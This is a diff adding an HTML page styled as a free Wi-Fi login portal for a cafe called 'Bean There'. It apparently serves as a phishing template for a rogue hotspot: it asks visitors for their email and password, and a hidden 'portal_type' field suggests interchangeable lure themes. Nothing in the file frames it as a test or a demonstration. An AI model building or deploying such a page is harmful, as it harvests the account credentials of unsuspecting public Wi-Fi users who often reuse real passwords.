@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Free WiFi — Cafe Login</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+         background: #f4ede4; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 16px; }
+  .card { background: #fffaf4; border: 1px solid #e6d6c3; border-radius: 20px; padding: 34px 28px;
+          width: 100%; max-width: 400px; box-shadow: 0 18px 50px rgba(74, 47, 25, 0.16); }
+  .logo { width: 52px; height: 52px; border-radius: 14px; background: #6f4e37; color: #fff;
+          display: flex; align-items: center; justify-content: center; font-size: 1.6rem; margin: 0 auto 16px; }
+  h1 { text-align: center; font-size: 1.35rem; color: #3b2a1d; margin-bottom: 6px; }
+  p { text-align: center; color: #7a6350; font-size: 0.88rem; line-height: 1.5; margin-bottom: 22px; }
+  .field { margin-bottom: 14px; }
+  label { display: block; font-size: 0.8rem; color: #5a4636; margin-bottom: 6px; font-weight: 600; }
+  input { width: 100%; padding: 13px 14px; border: 1px solid #dcc8b4; border-radius: 10px;
+          font-size: 1rem; outline: none; background: #fff; }
+  input:focus { border-color: #6f4e37; }
+  button { width: 100%; padding: 14px; background: #6f4e37; color: #fff; border: none;
+           border-radius: 10px; font-size: 1rem; font-weight: 700; cursor: pointer; margin-top: 6px; }
+  .footer { text-align: center; margin-top: 18px; font-size: 0.72rem; color: #a08a75; }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">&#9749;</div>
+  <h1>Welcome to Bean There</h1>
+  <p>Sign in for free Wi-Fi with your email. One cup, unlimited browsing.</p>
+  <form method="POST" action="/portal/submit">
+    <input type="hidden" name="portal_type" value="coffee">
+    <div class="field">
+      <label for="email">Email address</label>
+      <input type="email" id="email" name="email" placeholder="you@example.com" required>
+    </div>
+    <div class="field">
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" placeholder="Enter password" required>
+    </div>
+    <button type="submit">Connect to Wi-Fi</button>
+  </form>
+  <div class="footer">By connecting you agree to our terms and acceptable use policy.</div>
+</div>
+</body>
+</html>
